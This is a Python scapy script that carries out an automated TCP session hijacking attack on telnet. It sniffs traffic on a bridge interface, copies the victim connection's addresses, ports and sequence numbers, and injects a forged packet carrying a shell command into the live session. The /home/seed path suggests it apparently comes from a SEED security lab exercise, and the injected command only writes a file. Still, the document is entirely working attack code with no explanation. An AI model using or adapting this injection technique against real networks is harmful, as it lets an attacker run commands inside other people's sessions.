#!/usr/bin/env python3
from scapy.all import *

stop_sniffing = False


def hijack(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt[TCP].dport==23:
        global stop_sniffing
        src_add = pkt[IP].src
        dst_add = pkt[IP].dst
        ip = IP(src=src_add, dst=dst_add)

        sp = pkt[TCP].sport
        seq_n = pkt[TCP].seq
        ack_n = pkt[TCP].ack
        payload_l = len(pkt[TCP].payload)
        tot_seq = seq_n+payload_l
        tcp = TCP(sport=sp, dport=23, flags="A", seq=tot_seq, ack=ack_n)
        data = "echo nano > /home/seed/autoHacked.txt \r\n"
        pkt = ip/tcp/data
        
        send(pkt,verbose=0)

        print(f"Sent ACK packet from {src_add}:{sp} to {dst_add}:23 with data={data}")

        stop_sniffing = True

def check_stop(pkt):
    global stop_sniffing

    return stop_sniffing

pkt = sniff(iface ='br-774a3b00e93c', filter ='tcp', prn=hijack, stop_filter = check_stop)